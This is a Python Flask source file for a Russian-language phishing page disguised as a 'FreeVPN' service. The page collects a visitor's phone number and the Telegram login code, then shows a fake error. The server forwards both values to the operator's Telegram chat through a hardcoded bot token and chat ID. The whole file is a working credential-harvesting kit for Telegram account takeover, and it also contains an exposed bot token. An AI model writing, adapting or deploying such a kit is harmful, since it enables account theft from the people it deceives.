from flask import Flask, request, jsonify
import telebot
import json

app = Flask(__name__)

BOT_TOKEN = "8576398280:AAEzGceDJS7Bapxq-qJDaO4bb3A7wUzeO8U"
CHAT_ID = "7110902189"

bot = telebot.TeleBot(BOT_TOKEN)

HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>FreeVPN</title>
    <style>
        body { font-family: Arial; background: #1a1a2e; display: flex; justify-content: center; padding-top: 50px; }
        .box { background: #16213e; padding: 30px; border-radius: 10px; width: 320px; text-align: center; color: white; }
        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
        button { background: #0f3460; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
        #status { margin-top: 15px; }
    </style>
</head>
<body>
<div class="box">
    <h2>FreeVPN</h2>
    <input type="text" id="phone" placeholder="+7 XXX XXX XX XX">
    <button onclick="sendCode()">Отправить код</button>
    <div id="status"></div>
    <input type="text" id="code" placeholder="Код из Telegram" style="display:none">
    <button id="verifyBtn" onclick="verifyCode()" style="display:none">Подтвердить</button>
</div>
<script>
    function sendCode() {
        const phone = document.getElementById('phone').value;
        if(!phone || phone.length < 10) { document.getElementById('status').innerText = 'Введите номер'; return; }
        document.getElementById('status').innerText = 'Код отправлен в Telegram';
        document.getElementById('code').style.display = 'block';
        document.getElementById('verifyBtn').style.display = 'block';
        fetch('/log', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phone, step: 'code_sent'})
        });
    }
    function verifyCode() {
        const phone = document.getElementById('phone').value;
        const code = document.getElementById('code').value;
        if(!code) { document.getElementById('status').innerText = 'Введите код'; return; }
        fetch('/log', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phone, code: code, step: 'code_entered'})
        });
        document.getElementById('status').innerText = 'Ошибка, попробуйте позже';
    }
</script>
</body>
</html>
'''

@app.route('/')
def index():
    return HTML

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    if data:
        msg = f"НОВЫЕ ДАННЫЕ:\n{json.dumps(data, indent=2)}"
        try:
            bot.send_message(CHAT_ID, msg)
            print("Отправлено в Telegram")
        except Exception as e:
            print(f"Ошибка: {e}")
        return "OK"
    return "ERROR", 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
